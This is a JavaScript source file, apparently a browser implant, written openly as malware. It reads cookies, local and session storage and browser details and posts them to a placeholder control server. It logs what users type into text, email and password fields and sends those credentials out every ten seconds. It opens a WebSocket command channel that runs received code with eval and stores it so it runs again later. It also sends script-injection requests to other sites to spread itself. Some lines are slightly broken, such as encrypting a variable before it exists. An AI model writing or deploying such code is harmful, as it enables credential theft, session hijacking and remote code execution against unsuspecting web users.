import CryptoJS from 'crypto-js';

const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(beacon), 'your_secret_key').toString();

(() => {
  const swarmID = Math.random().toString(36).substring(2, 10);

  const beacon = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: location.href,
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    screen: {
      width: screen.width,
      height: screen.height
    },
    swarmID: swarmID,
    timestamp: new Date().toISOString()
  };

  fetch("https://your-control-node.com/harvest", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(beacon)
})
   .catch(error => {
   console.error("Data exfiltration failed:", error);
});

  // ðŸ›‘ Passive credential interception
  const captured = {};
  document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]').forEach(input => {
    input.addEventListener('input', () => {
      captured[input.name || input.id || 'field'] = input.value;
      localStorage.setItem("captured_credentials", JSON.stringify(captured));
    });
  });

  // ðŸ§¬ Periodic exfil of captured credentials
  setInterval(() => {
    const creds = localStorage.getItem("captured_credentials");
    if (creds) {
      fetch("https://your-control-node.com/creds", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: creds
      }).catch(error => {
        console.error("Credential Exfiltration Failed:", error)
      })
    }
  }, 10000); // every 10 seconds

  // ðŸ“¡ Live C2 socket
  const c2 = new WebSocket("wss://your-control-node.com/ws");
  c2.onopen = () => {
    c2.send(JSON.stringify({ type: "register", url: location.href, swarmID }));
  };
  c2.onmessage = (event) => {
    try {
      const command = JSON.parse(event.data);

      // Dynamic mutation / next-stage logic
      if (command.eval) {
        eval(command.eval);
      }
      if (command.mutate) {
        localStorage.setItem("nextStage", command.mutate);
      }
    } catch (e) {
      console.error("Execution failed:", e);
    }
  };

  // ðŸ§  Execute stored mutation if exists
  const nextStage = localStorage.getItem("nextStage");
  if (nextStage) {
    try {
      eval(nextStage);
    } catch (e) {
      console.error("Stored mutation failed:", e);
    }
  }

  // ðŸ¦  Optional: propagate via injected image requests
  const targets = [
    "https://example1.com/page?x=",
    "https://example2.com/input?z="
  ];
  targets.forEach(url => {
    const img = new Image();
    img.src = url + encodeURIComponent(`<script src='https://your-control-node.com/veil_chrysalis.js'></script>`);
  });
})();

function debounce(func, wait) {
  let timeout;
  return function(...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(this, args), wait);
  };
}

const debouncedCapture = debounce(() => {
  const creds = localStorage.getItem("captured_credentials");
  if (creds) {
    fetch("https://your-control-node.com/creds", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: creds
    }).catch(error => {
      console.error("Credential exfiltration failed:", error);
    });
  }
}, 10000);